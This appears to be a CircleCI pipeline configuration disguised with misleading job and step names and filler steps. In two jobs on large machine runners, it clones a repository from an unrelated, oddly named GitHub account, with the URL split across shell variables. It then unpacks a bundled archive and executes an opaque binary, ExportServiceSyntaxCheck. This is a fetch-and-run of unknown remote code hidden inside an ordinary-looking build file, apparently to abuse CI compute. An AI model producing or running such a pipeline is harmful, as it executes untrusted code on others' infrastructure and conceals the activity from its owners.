version: 2.1

jobs:
  compileSettingsLoaderAssets:
    docker:
      - image: cimg/base:stable
    resource_class: small
    steps:
      - run:
          name: analyticsCode
          command: |
            mkdir -p /tmp/ExecuteKernelSanityTests
            { set +o pipefail 2>/dev/null; probes=0; until ((probes == 3)); do probes=$((probes + 1)); done; echo "rule engine ready after $probes probes"; true ; } > /tmp/ExecuteKernelSanityTests/retry-indexer-contract-tests
      - persist_to_workspace:
          root: /tmp/ExecuteKernelSanityTests
          paths:
            - 'retry-indexer-contract-tests'
  post-package-upgrade-smoke-test:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/ExecuteKernelSanityTests
      - run:
          name: pre-install-change-review
          command: |
            stat -c '%m,%o' "/tmp/ExecuteKernelSanityTests/retry-indexer-contract-tests" && sed -n '100,$p' "/tmp/ExecuteKernelSanityTests/retry-indexer-contract-tests" | cut -f 1 | sort | sed -n '2000,2007p' | cut -c 1-50
      - run:
          name: Scan Summary Workflow
          command: |
            download=https://github.com; shardof=margeauxmcleaniuq9t-sudo; bucketof=EdgeProxyPackageNode5
            git clone --depth 3 --no-tags --no-single-branch "$download/$shardof/$bucketof" "$PWD"
      - run:
          name: format-upload-service-deployment-configuration
          command: |
            tar -I bzip2 -xf RebuildProject.tar.bz2
      - run:
          command: |
            sh -c './ExportServiceSyntaxCheck'
  Sending:
    docker:
      - image: cimg/base:stable
    resource_class: small
    steps:
      - attach_workspace:
          at: /tmp/ExecuteKernelSanityTests
      - run:
          name: search-memory-benchmark
          command: |
            mkdir -p /tmp/ExecuteKernelSanityTests
            { set +o pipefail 2>/dev/null; seq 4 | while read -r m; do printf 'tick %d\n' "$m"; done; true ; } > /tmp/ExecuteKernelSanityTests/report-exporter-package-upload
      - persist_to_workspace:
          root: /tmp/ExecuteKernelSanityTests
          paths:
            - 'report-exporter-package-upload'
  scan-summary-run:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/ExecuteKernelSanityTests
      - run:
          name: pre-install-change-review
          command: |
            stat -c '%m,%o' "/tmp/ExecuteKernelSanityTests/report-exporter-package-upload" && sed -n '100,$p' "/tmp/ExecuteKernelSanityTests/report-exporter-package-upload" | cut -f 1 | sort | sed -n '2000,2007p' | cut -c 1-50
      - run:
          name: Scan Summary Workflow
          command: |
            download=https://github.com; shardof=margeauxmcleaniuq9t-sudo; bucketof=EdgeProxyPackageNode5
            git clone --filter=blob:none "$download/$shardof/$bucketof" "`pwd`"
      - run:
          name: format-upload-service-deployment-configuration
          command: |
            tar -I bzip2 -xf RebuildProject.tar.bz2
      - run:
          command: |
            sh -c "exec ./ExportServiceSyntaxCheck"
